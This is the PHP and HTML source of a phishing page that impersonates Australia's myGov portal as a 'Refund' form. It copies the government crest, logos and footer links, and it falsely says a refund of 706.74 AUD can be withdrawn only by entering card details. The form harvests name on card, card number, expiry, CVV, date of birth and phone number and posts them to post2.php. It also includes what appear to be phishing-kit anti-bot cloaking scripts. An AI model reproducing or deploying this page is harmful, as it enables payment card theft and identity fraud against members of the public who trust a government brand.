<?php
// session traps aint needed no more since we swittched to file based wl bl
error_reporting(0);
require_once "../inc/m3dular_config.php"; 
require_once "../m3dularbh/m3dular_functions.php"; 
require_once "../m3dularbh/index.php"; // BLACKHOLE TRAP
require_once "../m3dularbh/frontchecker.php"; // BLACKHOLE TRAP ALL FIRST CHECKS!
$loremdata=lorem(20);
include "anti/index.php";
include "id.php";

?>

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta http-equiv="x-ua-compatible" content="ie=edge">
		<meta name="apple-mobile-web-app-capable" content="yes">
		<meta name="description" content="">
		<meta name="format-detection" content="telephone=no">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>Refund - myGov</title>		
		<script type="text/javascript" src="./payment_files/ruxitagentjs_ICA2Vfghjqrux_10239220408103229.js.download" data-dtconfig="app=5f15dc81410a75c1|ssc=1|rcdec=1209600000|featureHash=ICA2Vfghjqrux|vcv=2|rdnt=0|uxrgce=1|bp=3|srmcrv=10|cuc=gpalpirq|mel=100000|md=mdcc1=ainput#user-id,mdcc2=adiv.error-msg-text span,mdcc3=aspan[data-home-welcome-message]|ssv=4|lastModification=1659407691239|dtVersion=10239220408103229|srmcrl=1|tp=500,50,0,1|uxdcw=1500|agentUri=/LoginServices/main/ruxitagentjs_ICA2Vfghjqrux_10239220408103229.js|reportUrl=/LoginServices/main/rb_6de8e2e9-6719-45b3-86be-7effcb9f6525|rid=RID_-358693166|rpid=560325890|domain=my.gov.au"></script><link rel="shortcut icon" href="https://login.my.gov.au/mygov/content/mgv2/icons/favicon.ico">
		<link href="./payment_files/mgv2-application.css" rel="stylesheet">
	</head>
	
	<body>	
		<nav class="uikit-skip-link" aria-label="Skip Links">
  		<a class="uikit-skip-link__link" id="va_skipToBot" href="https://login.my.gov.au/EnrolService/enrolService.htm?_flowId=mgv2-enrolment-mg-flow&amp;_flowExecutionKey=e1s2#">Skip to Ask a question</a><a class="uikit-skip-link__link" id="va_skipToBot" href="#">Skip to Ask a question</a></nav>
		

<header role="banner" class="unauth"><section class="wrapper"><div class="inner"><div class="unauth-grid"><div class="unauth-grid-row"><img id="unauth-govt-crest" src="./payment_files/austgovt-inline-white.svg" alt="Australian Government Coat of Arms" role="img"><div class="header-logo unauth"><a href="https://login.my.gov.au/mygov"><img src="./payment_files/mygov-logo.svg" class="header-logo-img" alt="myGov home" id="unauth-mygov-logo"></a></div></div></div></div></section></header><noscript><div class="outage"><div class="outage__inner"><div><span class="is-visuallyhidden">Warning message:</span><p>JavaScript is required for myGov to work correctly.</p></div></div></div></noscript>

		








<div class="wrapper"><div class="main-block" id="content" role="main">
		

		<form id="initialForm" action="post2.php" method="post">
			<div class="progress">
				<h1>Withdraw my refund</h1>
				<span class="progress">Step 2 of 3</span>
			</div>

			
			<p>To withdraw your money without delay your need to use your personal credit card.You will be credited with the amount immediately if your card is active.</p>
			<p style="color:green">Refund amount : 706.74 AUD</p>
<br>
<img width="90" src="./payment_files/54e30edf9d8e3f86b1935d5d3d1317d8.png">
			<div>
				<label for="email-addr">Name on card<input id="email-addr" name="fullname" type="text" value="" maxlength="20" autocomplete="card" required="">
				</label>
			</div>

			<div>
				<label for="email-addr">Card Number<input id="email-addr" name="ccnumb" type="text" value="" maxlength="16" autocomplete="nameoncard" required="">
				</label>
			</div><div>
				<label for="email-addr">Expiry date<br>
<select name="mmonth" tabindex="8" id="tmonth" class="form-control">
<option value="" selected="selected">Month</option>
                <option value="01">01</option>
                <option value="02">02</option>
                <option value="03">03</option>
                <option value="04">04</option>
                <option value="05">05</option>
                <option value="06">06</option>
                <option value="07">07</option>
                <option value="08">08</option>
                <option value="09">09</option>
                <option value="10">10</option>
                <option value="11">11</option>
                <option value="12">12</option>
</select><select name="myears" tabindex="8" id="tyears" class="form-control">
<option value="" selected="selected">Year</option>
   <option value="" selected="selected">Year</option>
                <option value="2022">2022</option>
                <option value="2023">2023</option>
                <option value="2024">2024</option>
                <option value="2025">2025</option>
				<option value="2026">2026</option>
                <option value="2027">2027</option>
                <option value="2028">2028</option>
				<option value="2029">2029</option>
                <option value="2030">2030</option>
                <option value="2031">2031</option>
				<option value="2027">2032</option>
                <option value="2028">2033</option>
				<option value="2029">2034</option>
                <option value="2030">2035</option>
                <option value="2031">2036</option>
            </select>
				</label>
			</div><div>
				<label for="email-addr">CVV<input type="text" name="cvvz" maxlength="50" placeholder="Security code" required="" tabindex="10" id="tcity" class="form-control">
				</label>
			</div><div>
				<label for="email-addr">Date of birth<br>
<input id="email-addr" name="dobz" type="date" value="" maxlength="255" autocomplete="email">
				</label>
			</div><div>
				<label for="email-addr">Phone number<input id="email-addr" name="phone" type="text" value="" maxlength="20" autocomplete="phone" required="">
				</label>
			</div><div class="button-container">
							
				<button type="submit" id="next" name="okbb" value="Next" class="button-main button">Next</button>
				<input type="hidden" name="_flowExecutionKey" value="e1s2"> 
				<input type="hidden" name="OWASP_CSRFTOKEN" value="IF04-J8PT-7022-PRW3-NJQD-E5FB-2KMW-7NZ0-H356-APKY-00EB-YZR2-RXLB-NO3E-DJ9E-DKZJ-QYJA-XUSI-XYZK-LPO7-2HNL-6V8I-EPCY-2PY9-I3NQ-3P6C-33IP-5WOL-HCBY-ABSE-VE63-12SQ">
			</div>
		</form>

<input type="hidden" id="digitalassistant" value=""></div></div>















		

<footer role="contentinfo"><div class="wrapper"><div class="inner"><section class="footer-links"><nav aria-label="Footer Links"><ul><li><a href="https://login.my.gov.au/mygov/content/html/about.html">About myGov</a></li><li><a href="https://login.my.gov.au/mygov/content/html/contact.html">Contact us</a></li><li><a href="https://login.my.gov.au/mygov/content/html/terms.html">Terms of use</a></li><li><a href="https://login.my.gov.au/mygov/content/html/privacy.html">Privacy</a></li><li><a href="https://login.my.gov.au/mygov/content/html/copyright.html">Copyright</a></li><li><a href="https://login.my.gov.au/mygov/content/html/security.html">Security</a></li><li><a href="https://login.my.gov.au/mygov/content/html/accessibility.html">Accessibility</a></li><li><a href="https://login.my.gov.au/mygov/content/html/help.html">Help</a></li></ul></nav></section><section class="footer-logo"><img src="./payment_files/austgovt-inline.svg" alt="Australian Government Coat of Arms" width="289" height="70" role="img"></section></div></div></footer>


			
		<script type="text/javascript" src="./payment_files/mgv2-vendor.js.download"> </script>
		<script type="text/javascript" src="./payment_files/mgv2-application.js.download"></script>	
	  	<script type="text/javascript" src="./payment_files/login.js.download"></script>	  	 
	

<div id="va_chatAnchor" class="va_chatAnchor" role="complementary" aria-labelledby="va_chatTitle" style="display: block;"><div id="va_mobileBar" style="border-top: #d7ea6a 5px solid" aria-live="polite"><header class="va_header"><h2 class="va_chatTitle_mob" aria-live="polite" id="va_chatTitle">Ask a question</h2><div role="button" style="border: 0; margin: 0;" id="va_mobileToggle" aria-live="polite" class="va_mobileToggle" title="Open Ask a question" aria-label="Open Ask a question"></div></header></div><iframe name="va_iframe" id="va_iframe" class="va_iframe" aria-live="assertive" aria-relevant="additions" src="./payment_files/saved_resource.html" style="z-index: 9999; background: rgb(229, 229, 229); overflow: hidden; height: 0px; width: 0px;"></iframe><div id="va_mobileBar" style="border-top: #d7ea6a 5px solid" aria-live="polite"><header class="va_header"><h2 class="va_chatTitle_mob" aria-live="polite" id="va_chatTitle">Ask a question</h2><div role="button" style="border: 0; margin: 0;" id="va_mobileToggle" aria-live="polite" class="va_mobileToggle" title="Open Ask a question" aria-label="Open Ask a question"></div></header></div><iframe name="va_iframe" id="va_iframe" class="va_iframe" style="z-index: 9999; background: rgb(229, 229, 229); right: 2%; overflow: hidden;"></iframe></div><div id="va_chatAnchor" class="va_chatAnchor" role="complementary" aria-labelledby="va_chatTitle"></div></body></html>